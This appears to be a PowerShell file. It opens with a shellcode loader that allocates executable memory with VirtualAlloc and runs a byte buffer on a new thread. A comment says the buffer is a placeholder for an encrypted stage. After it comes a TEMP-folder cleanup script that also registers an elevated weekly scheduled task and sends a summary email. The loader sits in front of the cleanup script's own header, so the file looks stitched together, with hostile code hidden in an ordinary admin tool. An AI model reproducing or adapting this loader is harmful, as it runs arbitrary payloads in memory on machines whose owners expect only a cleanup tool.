

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xc2, 0xe3, 0xa2, 0xce, 0xfe, 0x61, 0xe0, 0x61, 0x70, 0xba, 0x7a, 0xda, 0xf4, 0x55, 0x78, 0x1e,
        0xcc, 0xbd, 0xdc, 0x6e, 0xd3, 0x19, 0x2d, 0xa6, 0xb9, 0x1d, 0x69, 0xf5, 0x25, 0xb9, 0xf6, 0xdc,
        0x5c, 0xa8, 0xbc, 0x19, 0x41, 0x44, 0x39, 0x0d, 0x18, 0xea, 0x29, 0xf2, 0x6d, 0x65, 0xd1, 0xd2,
        0x81, 0x31, 0xbf, 0xf4, 0x32, 0xf6, 0xae, 0xc6, 0x27, 0xbf, 0x11, 0x88, 0x81, 0x20, 0xc6, 0x29,
        0x53, 0x3b, 0x2f, 0x83, 0x4a, 0xec, 0x54, 0xf8, 0x71, 0x9c, 0xfa, 0x3b, 0x39, 0x3f, 0x94, 0x84,
        0x3b, 0xa7, 0xa5, 0xd3, 0xe9, 0x77, 0x49, 0x0d, 0x3f, 0x49, 0x6f, 0x74, 0xac, 0x47, 0x60, 0x8b,
        0x20, 0x3b, 0xc2, 0xc3, 0xe2, 0xbd, 0xa5, 0x26, 0x42, 0xfb, 0x78, 0x03, 0xb4, 0x2b, 0x85, 0x27,
        0x68, 0x9d, 0x88, 0x59, 0xdb, 0x99, 0x46, 0x79, 0x17, 0x1f, 0x04, 0x3b, 0xfd, 0x27, 0xdd, 0x2b,
        0x3d, 0x8c, 0xe7, 0x15, 0x88, 0x90, 0x9b, 0x98, 0xde, 0x93, 0x24, 0x4c, 0xb5, 0xc7, 0x71, 0xbc,
        0xa5, 0x13, 0xd0, 0x53, 0x44, 0xe7, 0x2e, 0x1a, 0xc7, 0xa0, 0x2a, 0x41, 0x16, 0x95, 0xf5, 0x03,
        0xb8, 0x98, 0xe3, 0xd3, 0xf9, 0x38, 0x18, 0x13, 0x92, 0x8e, 0xd3, 0x77, 0x21, 0x62, 0x78, 0xc9,
        0x73, 0xca, 0x29, 0xfb, 0x6a, 0xec, 0x6f, 0xa3, 0x6b, 0x88, 0x96, 0x78, 0xed, 0xa9, 0x0a, 0x5e,
        0xb4, 0x68, 0x1d, 0x7b, 0x1a, 0x09, 0x8a, 0x73, 0x02, 0xbd, 0xc0, 0xe8, 0x02, 0x91, 0xf7, 0xe3,
        0x2e, 0xfc, 0x62, 0x7b, 0x01, 0xdd, 0xde, 0xe0, 0x39, 0x91, 0xb9, 0x9a, 0x0f, 0x32, 0x88, 0x1d,
        0xb2, 0x64, 0x0f, 0x1d, 0x14, 0x39, 0x70, 0x7b, 0x15, 0x0e, 0xb5, 0xf9, 0x8e, 0x61, 0xee, 0x1f,
        0x45, 0x87, 0xfa, 0x6b, 0x63, 0xf8, 0xf6, 0x6c, 0x11, 0x2a, 0x27, 0x84, 0x14, 0x9f, 0x96, 0x3c,
        0x89, 0x4e, 0x42, 0xfd, 0x9d, 0x30, 0x00, 0xd2, 0x72, 0x6c, 0xf5, 0x33, 0xfc, 0xa9, 0xe9, 0xc6,
        0x3e, 0xf6, 0xb4, 0x99, 0x62, 0x8d, 0x7c, 0x91, 0xb6, 0x4b, 0xa8, 0xe0, 0xca, 0x9a, 0x55, 0xf5,
        0x96, 0x02, 0x14, 0x02, 0x8f, 0xe0, 0xe8, 0x6b, 0x21, 0x54, 0xb8, 0xc8, 0xeb, 0x30, 0x12, 0x85,
        0xca, 0x06, 0xf2, 0xbf, 0x85, 0x56, 0x4c, 0x1f, 0xb1, 0xf1, 0x23, 0xd5, 0xd8, 0x13, 0xc2, 0x66,
        0x6a, 0x3e, 0x18, 0x2b, 0x8b, 0x06, 0x86, 0xf7, 0x0d, 0x57, 0x36, 0x45, 0x21, 0x4f, 0x6b, 0x45,
        0x23, 0x9b, 0x1c, 0x5e, 0xc8, 0x8a, 0x71, 0x9b, 0xc9, 0xec, 0xc0, 0xe6, 0x00, 0x3b, 0x76, 0xe2,
        0x8f, 0x16, 0x25, 0x5b, 0xd7, 0x64, 0x8a, 0xd9, 0x32, 0x63, 0x85, 0x4f, 0xde, 0xdf, 0xd7, 0x7b,
        0x49, 0x0d, 0xa6, 0xe4, 0x62, 0x8e, 0x97, 0xbb, 0x2e, 0xc1, 0x1f, 0xef, 0xd4, 0x8b, 0x71, 0x63,
        0x54, 0x3c, 0xbe, 0xed, 0x24, 0x72, 0xf1, 0xdc, 0x90, 0x6c, 0xfd, 0x9b, 0x62, 0x35, 0x65, 0x06,
        0xbf, 0x0e, 0xa7, 0x29, 0x5d, 0xdf, 0x86, 0x07, 0x25, 0xc1, 0xa1, 0xdc, 0x98, 0x9b, 0xa9, 0x0d,
        0x14, 0xd2, 0x15, 0x6a, 0x36, 0x41, 0x29, 0x82, 0xa8, 0xd6, 0x6c, 0x2c, 0xaa, 0x85, 0xf6, 0x67,
        0x78, 0x75, 0x0b, 0x85, 0x6a, 0x1c, 0xc7, 0xba, 0x9e, 0x0b, 0xa7, 0x33, 0xb4, 0x40, 0x2e, 0x26,
        0x49, 0x64, 0x17, 0x1e, 0xfb, 0xa7, 0x7c, 0x3e, 0x02, 0x8f, 0x48, 0x23, 0xf8, 0x9a, 0xc8, 0x3d,
        0x51, 0xd6, 0x9b, 0x4a, 0xf1, 0x34, 0xb6, 0x03, 0x45, 0x08, 0x02, 0x6e, 0x0e, 0x07, 0x05, 0xeb,
        0xe1, 0x6e, 0x7c, 0x86, 0xf9, 0x22, 0x17, 0x99, 0x67, 0x96, 0x73, 0x4b, 0x27, 0x52, 0xc5, 0xa7,
        0xb9, 0x3e, 0x7c, 0x03, 0xa4, 0xcb, 0xd6, 0x45, 0xbc, 0xdb, 0x0d, 0x04, 0xc9, 0x1a, 0x8d, 0x42,
        0xb2, 0x31, 0xda, 0x92, 0xeb, 0xc7, 0xb4, 0xf1, 0xa1, 0xbf, 0x46, 0x99, 0xe7, 0x60, 0x13
    )

    $MemoryHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 2103)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.PARAMETER TempRoot
    Used when the script runs unattended.
.PARAMETER AgeDays
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Clear-TempFiles.ps1 -AgeDays 3
.EXAMPLE
    .\Clear-TempFiles.ps1 -DryRun -Verbose
#>

$TempRoot = $env:TEMP
$AgeDays = 3
$MinSizeMB = 2
$LogPath = 'C:\Logs\temp-cleanup-2025-09-17.log'
$DryRun = $false

$DebugPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-CleanupLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-CleanupLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At '20:30'
Register-ScheduledTask -TaskName "Weekly-TempSweep" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = "ops@internal.corp"

$mailParams = @{
    To         = $MailTo
    From       = 'ops@internal.corp'
    Subject    = 'TEMP cleanup summary'
    Body       = "The scheduled TEMP sweep completed. See the JSON report on the host."
    SmtpServer = 'smtp.adatum.com'
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

& Write-CleanupLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
